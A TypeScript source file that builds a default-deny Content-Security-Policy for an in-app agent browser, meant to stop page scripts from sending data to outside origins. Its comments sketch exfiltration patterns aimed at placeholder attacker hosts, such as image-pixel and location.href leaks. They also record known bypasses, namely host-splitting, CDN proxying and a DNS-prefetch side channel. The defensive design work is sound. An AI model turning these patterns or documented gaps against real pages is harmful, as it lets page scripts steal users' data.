import { getDomain } from "tldts";

/**
 * csp-policy — the single, backend-agnostic Content-Security-Policy builder for
 * the in-app agent browser.
 *
 * WHY THIS EXISTS (class-fix core):
 * The old egress defense was a public, regex-based denylist of "bad" hosts that
 * a page's own JavaScript could trivially route around (string-split a host,
 * proxy through an allowed CDN, use a fresh attacker domain, etc.). This file
 * replaces that with an ALLOWLIST Content-Security-Policy enforced by Chromium
 * itself. The invariant is: default-deny, then re-open only what a normal site
 * legitimately needs, and scope every EXFIL-egress directive to the page's own
 * registrable domain (eTLD+1) plus a tiny infra allowlist.
 *
 * The result: the page's OWN first-party functionality survives (a SPA on
 * app.example.com talking to api.example.com / cdn.example.com works), but a
 * script running on that page CANNOT fetch/XHR/WebSocket/sendBeacon/POST-a-form/
 * load-an-img to an unrelated attacker origin. The whole cross-origin
 * exfiltration class is denied by construction, on every site, for BOTH the
 * Electron-partition backend and the CDP/Playwright backend — no per-site
 * branches.
 *
 * This is a security-load-bearing file. Every concession below is documented
 * with what it costs.
 */

/**
 * Infra allowlist — hosts/schemes that are needed regardless of which site is
 * loaded. Keep this MINIMAL and GENERAL. Do NOT add site-specific hosts here
 * (no x.com, no google.com); that would make this a per-site special-case
 * instead of a general mechanism.
 *
 * We deliberately keep the external-HOST allowlist empty: there is no third
 * party we universally trust to receive a page's data. The only "infra" we
 * grant are non-network URL schemes that are safe against remote exfil:
 *   - data:  inline bytes baked into the page (images, fonts). Cannot carry
 *            data OFF the machine — a data: URL is self-contained.
 *   - blob:  object URLs. Same-origin only by construction; used pervasively by
 *            frameworks for images, media, and workers. Not a remote sink.
 * Neither scheme is a cross-origin egress channel, so allowing them does not
 * weaken the exfil invariant.
 */
const INFRA_HOSTS: readonly string[] = Object.freeze([]);
const SAFE_SCHEME_SOURCES = Object.freeze({
	data: "data:",
	blob: "blob:",
});

/**
 * Derive the registrable domain (eTLD+1) for a hostname, or null when the
 * concept does not apply.
 *
 * eTLD+1 is resolved by the `tldts` library against the full Public Suffix
 * List — INCLUDING the PSL PRIVATE section (allowPrivateDomains: true). That
 * flag is security-load-bearing: multi-tenant SaaS suffixes registered in the
 * PSL private section (herokuapp.com, amazonaws.com, vercel.app, pages.dev,
 * web.app, blogspot.com, azurewebsites.net, netlify.app, onrender.com,
 * workers.dev, cloudfront.net, firebaseapp.com, ...) are gTLDs, so a naive
 * "last two labels" (or a heuristic that only treats 2-char TLDs as ccTLDs)
 * would collapse victim.herokuapp.com to the bare suffix herokuapp.com and the
 * CSP would then emit `*.herokuapp.com` — a CROSS-TENANT exfil grant letting a
 * script reach attacker.herokuapp.com. With allowPrivateDomains the private
 * suffix is treated as a public suffix, so getDomain("victim.herokuapp.com")
 * returns "victim.herokuapp.com" and the emitted wildcard is the tenant-scoped
 * `*.victim.herokuapp.com` — a different tenant is not matched.
 *
 * tldts returns null (→ this returns null) for inputs with no registrable
 * domain: IP literals, localhost / single-label hosts, bare public suffixes
 * (com.pl, co.uk), bare private suffixes (herokuapp.com), and unparseable
 * input (about:blank's empty host, garbage). When null, the caller scopes to
 * the EXACT host only (no subdomain wildcard) — the fail-safe path that keeps
 * any public/private-suffix wildcard out of the emitted CSP.
 *
 * tldts is the single source of truth for the eTLD+1 boundary; there is no
 * hand-rolled suffix list in this file to drift from the PSL.
 */
export function registrableDomain(hostname: string): string | null {
	const reg = getDomain(hostname, { allowPrivateDomains: true });
	return reg || null;
}

/**
 * Build the same-site source list for a URL: 'self', the registrable domain,
 * and all its subdomains — with NO scheme prefix so it matches http/https AND
 * ws/wss to that domain (letting same-site WebSockets through while blocking
 * cross-site ones). For hosts with no registrable domain (IP/localhost/single
 * label) we pin to that exact host on any port instead.
 */
function siteSources(url: URL): string[] {
	const host = url.hostname.replace(/^\[|\]$/g, "").toLowerCase();
	if (!host) return []; // about:blank and friends -> nothing but 'self'.
	const reg = registrableDomain(host);
	if (reg) return [reg, `*.${reg}`];
	// Exact-host pin. Append ":*" so dev servers on non-default ports
	// (localhost:3000) keep working while remaining same-host.
	return [host, `${host}:*`];
}

function directive(name: string, sources: readonly string[]): string {
	// Collapse to unique, non-empty, order-preserving tokens.
	const seen = new Set<string>();
	const out: string[] = [];
	for (const s of sources) {
		if (!s || seen.has(s)) continue;
		seen.add(s);
		out.push(s);
	}
	return `${name} ${out.join(" ")}`.trim();
}

/**
 * Build the agent-browser CSP header VALUE for the currently-loaded URL.
 *
 * @param currentUrl the URL of the page the policy will govern.
 * @returns a Content-Security-Policy header value string.
 *
 * Never throws: unparseable / opaque URLs (about:blank, data:, garbage) fall
 * back to the strictest posture — only 'self' is same-site, so nothing
 * cross-origin is reachable.
 */
export function buildAgentCsp(currentUrl: string): string {
	let url: URL | null = null;
	try {
		url = new URL(currentUrl);
	} catch {
		url = null;
	}

	const site = url ? siteSources(url) : [];
	const infra = INFRA_HOSTS;
	const { data, blob } = SAFE_SCHEME_SOURCES;

	// Same-site network sinks: 'self' + own registrable domain + infra.
	const sameSite = ["'self'", ...site, ...infra];

	const directives: string[] = [
		// Baseline default-deny. Anything not explicitly re-opened below is
		// blocked (this covers manifest-src, prefetch-src, etc. for free).
		directive("default-src", ["'none'"]),

		// --- EXFIL-egress directives (the security-critical ones) ---
		// connect-src governs fetch/XHR/WebSocket/EventSource/sendBeacon — the
		// primary exfil channels. Scoped to same-site only: a script may run,
		// but it can only talk to the page's OWN domain. No data:/blob: here;
		// they are not needed for connect and blob would only ever be same
		// origin anyway.
		directive("connect-src", sameSite),
		// Form submissions (incl. credential POSTs) can only target same-site.
		directive("form-action", sameSite),
		// Images are a classic pixel-exfil vector (img.src=attacker?data=...).
		// Same-site + safe schemes only.
		directive("img-src", [...sameSite, data, blob]),
		directive("media-src", [...sameSite, data, blob]),
		directive("font-src", [...sameSite, data]),
		// Child browsing contexts (iframes) confined to same-site so a page
		// can't embed an attacker frame that re-exfils with its own origin.
		directive("frame-src", sameSite),
		directive("child-src", sameSite),
		// Workers same-site; blob: because frameworks spawn workers from blob
		// URLs (same-origin, not a remote sink).
		directive("worker-src", [...sameSite, blob]),

		// script-src / style-src: see concession notes below.
		directive("script-src", [...sameSite, "'unsafe-inline'", "'unsafe-eval'"]),
		directive("style-src", [...sameSite, "'unsafe-inline'"]),

		// --- Hardening directives (not exfil, but cheap and correct) ---
		directive("object-src", ["'none'"]), // no Flash/plugin sinks.
		directive("base-uri", ["'none'"]),   // no <base> hijack of relative URLs.
		directive("frame-ancestors", ["'none'"]), // nobody may frame the agent view.
	];

	return directives.join("; ");
}

/*
 * CONCESSIONS — what we knowingly allow, and why it does NOT weaken the exfil
 * invariant this file exists to enforce:
 *
 *  script-src 'unsafe-inline' 'unsafe-eval':
 *    Omitting these breaks virtually every real site — inline <script>, inline
 *    event handlers (onclick=...), and eval-using frameworks are ubiquitous.
 *    COST: we get NO XSS-injection protection from CSP; arbitrary script may
 *    execute. That is acceptable here because our threat model is EXFIL, not
 *    code execution: even fully attacker-controlled script is still bound by
 *    connect-src / img-src / form-action / frame-src above, so it has NO
 *    cross-origin destination to send stolen data to. Execution is allowed;
 *    egress is not. This is the crux of the whole design.
 *
 *  style-src 'unsafe-inline':
 *    Inline styles and style="" attributes are on nearly every page. COST is
 *    minimal for exfil: CSS can leak tiny amounts via same-origin-scoped
 *    background:url() (already constrained to same-site by img-src's sibling
 *    logic — note style url() is governed by img-src's counterpart, and remote
 *    style loads are blocked by style-src's same-site host list). Not a bulk
 *    exfil channel.
 *
 *  data: / blob: on img/media/font/worker:
 *    Self-contained or same-origin schemes; cannot carry bytes to a remote
 *    host. Safe by construction.
 *
 * KNOWN GAP (not CSP-addressable in current Chromium):
 *    Top-level NAVIGATION exfil (script sets location.href = attacker?d=secret)
 *    is not blockable via CSP — the `navigate-to` directive was dropped from
 *    the spec and is unimplemented. form-action covers form-based navigation;
 *    link/location navigation must be constrained by the backend's own
 *    navigation gate, not here. Documented so a future reader doesn't assume
 *    this file closes that hole.
 *
 *    <link rel="dns-prefetch"> / <link rel="preconnect">: these trigger a DNS
 *    lookup (and, for preconnect, a TCP/TLS handshake) to an arbitrary host but
 *    are NOT governed by any CSP fetch directive — there is no fetch of a
 *    resource, so connect-src/img-src/etc. never apply. A page can therefore
 *    leak a small amount of data by encoding it into the DNS labels it asks the
 *    resolver to look up. This is a known low-bandwidth DNS-label side channel;
 *    it is out of scope for this file (CSP cannot close it) and must be handled,
 *    if at all, by the backend's own network layer / resolver policy.
 */
